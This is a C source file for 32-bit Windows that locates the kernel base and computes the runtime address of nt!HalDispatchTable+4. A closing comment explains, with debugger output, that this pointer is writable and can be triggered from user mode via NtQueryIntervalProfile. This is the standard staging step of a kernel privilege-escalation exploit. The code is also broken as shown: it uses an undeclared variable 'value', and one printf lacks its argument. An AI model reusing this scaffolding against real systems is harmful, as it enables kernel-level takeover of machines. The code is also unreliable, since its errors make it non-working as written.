#include <windows.h>
#include <stdio.h>

#if !defined(NT_SUCCESS)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#if !defined(STATUS_SUCCESS)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

typedef enum _SYSTEM_INFORMATION_CLASS
{
    SystemBasicInformation,
    SystemProcessorInformation,
    SystemPerformanceInformation,
    SystemTimeOfDayInformation,
    SystemPathInformation,
    SystemProcessInformation,
    SystemCallCountInformation,
    SystemDeviceInformation,
    SystemProcessorPerformanceInformation,
    SystemFlagsInformation,
    SystemCallTimeInformation,
    SystemModuleInformation
} SYSTEM_INFORMATION_CLASS,
*PSYSTEM_INFORMATION_CLASS;

typedef struct
{
    ULONG Reserved1;
    ULONG Reserved2;
    PVOID ImageBaseAddress;
    ULONG ImageSize;
    ULONG Flags;
    WORD Id;
    WORD Rank;
    WORD w018;
    WORD NameOffset;
    BYTE Name[256];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

#pragma warning(disable:4200)
typedef struct
{
    ULONG ModulesCount;
    SYSTEM_MODULE Modules[0];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

extern NTSTATUS WINAPI ZwQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);


PSYSTEM_MODULE GetKernelInformation()
{
    PSYSTEM_MODULE_INFORMATION pModuleList = NULL;
    PSYSTEM_MODULE pKernInfo = NULL;
    NTSTATUS status = STATUS_SUCCESS;
    ULONG neededSize = 0;

    ZwQuerySystemInformation(
        SystemModuleInformation,
        &neededSize,
        0,
        &neededSize
    );

    pModuleList = (PSYSTEM_MODULE_INFORMATION)malloc(neededSize);
    if(pModuleList == NULL)
    {
        printf("Error with malloc().\n");
        return NULL;
    }

    status = ZwQuerySystemInformation(SystemModuleInformation,
        pModuleList,
        neededSize,
        0
    );

    if(!NT_SUCCESS(status))
    {
        printf("Error with ZwQuerySystemInformation().\n");
        free(pModuleList);
        return NULL;
    }

    pKernInfo = (PSYSTEM_MODULE)malloc(sizeof(SYSTEM_MODULE));
    if(pKernInfo == NULL)
    {
        printf("Error with malloc().\n");
        free(pModuleList);
        return NULL;
    }

    memcpy(pKernInfo, pModuleList->Modules, sizeof(SYSTEM_MODULE));
    free(pModuleList);

    return pKernInfo;
}

DWORD GetKernelBase()
{
    PSYSTEM_MODULE pKernInfo = NULL;
    DWORD kernBase = 0;

    pKernInfo = GetKernelInformation();
    if(pKernInfo == NULL)
    {
        printf("Error with GetKernelInformation().\n");
        return 0;
    }

    kernBase = (DWORD)pKernInfo->ImageBaseAddress;
    free(pKernInfo);

    return kernBase;
}

PCHAR GetKernelPath()
{
    PSYSTEM_MODULE pKernInfo = NULL;
    PCHAR kernPath = NULL;
    DWORD size = 0;

    pKernInfo = GetKernelInformation();
    if(pKernInfo == NULL)
    {
        printf("Error with GetKernelInformation().\n");
        return 0;
    }

    size = sizeof(char) * (strlen(pKernInfo->Name) + 1);
    kernPath = (PCHAR)malloc(size);
    if(kernPath == NULL)
    {
        free(pKernInfo);
        printf("Error with malloc().\n");
        return NULL;
    }

    ZeroMemory(kernPath, size);
    memcpy(kernPath, pKernInfo->Name, size - sizeof(char));
    free(pKernInfo);

    return kernPath;
}

DWORD GetHalQuerySystemInformation()
{
    HMODULE hKern = 0;
    PCHAR pKernPath = NULL, pKern = NULL;
    DWORD HalDispatchTable = 0, kernBase = 0;

    kernBase = GetKernelBase();
    printf("[+] Kernel Base Address: %#.8X\n", kernBase);
    if(kernBase == 0)
    {
        printf("[!] Error with GetKernelBase().\n");
        goto clean;
    }

    pKernPath = GetKernelPath();
    if(pKernPath == NULL)
    {
        printf("[!] Error with GetKernelPath().\n");
        goto clean;
    }

    printf("[+] Kernel Path: '%s'\n", pKernPath);
    pKern = strrchr(pKernPath, '\\') + 1;

    printf("[+] Kernel: '%s'\n", pKern);
    hKern = LoadLibraryEx(pKern, NULL, DONT_RESOLVE_DLL_REFERENCES);

    printf("[+] Kernel Base Address (in this process context): %#.8X\n", hKern);
    HalDispatchTable = (DWORD)GetProcAddress(hKern, "HalDispatchTable");
    printf("[+] HalDispatchTable Address: 0x%.8X\n", HalDispatchTable);
    if(HalDispatchTable == 0)
    {
        printf("[!] Error with GetProcAddress().\n");
        goto clean;
    }

    if(value != NULL)
        *value = (*(PDWORD)(HalDispatchTable + sizeof(DWORD)) - (DWORD)hKern) + kernBase;

    HalDispatchTable -= (DWORD)hKern;
    HalDispatchTable += kernBase;

    printf("[+] HalDispatchTable Address (after normalization): %#.8X\n");

    clean:
    if(pKernPath != NULL)
        free(pKernPath);

    if(hKern != NULL)
        FreeLibrary(hKern);

    return HalDispatchTable + sizeof(DWORD);
}

/*
    HalDispatchTable trickz :

* Pointer nt!HalDispatchTable+4 is writeable (this symbol is obviously exported)
    kd> dps nt!HalDispatchTable l 2
    80544a38  00000003
    80544a3c  806e4bba hal!HaliQuerySystemInformation
    kd> !pte 80544a3c
                        VA 80544a3c
    PDE at C0602010            PTE at C0402A20
    contains 00000000004001E3  contains 0000000000000000
    pfn 400       -GLDA--KWEV   LARGE PAGE pfn 544

* How to call this pointer from userland ?
    kd> uf nt!NtQueryIntervalProfile
    nt!NtQueryIntervalProfile:
    [...]
    8060c88a e83de00200      call    nt!KeQueryIntervalProfile (8063a8cc)

    kd> uf nt!KeQueryIntervalProfile
    [...]
    8063a8fd ff153c4a5480    call    dword ptr [nt!HalDispatchTable+0x4 (80544a3c)]

*/

int main()
{
    printf("HalQuerySystemInformation: 0x%.8X", GetHalQuerySystemInformation());
    return EXIT_SUCCESS;
}
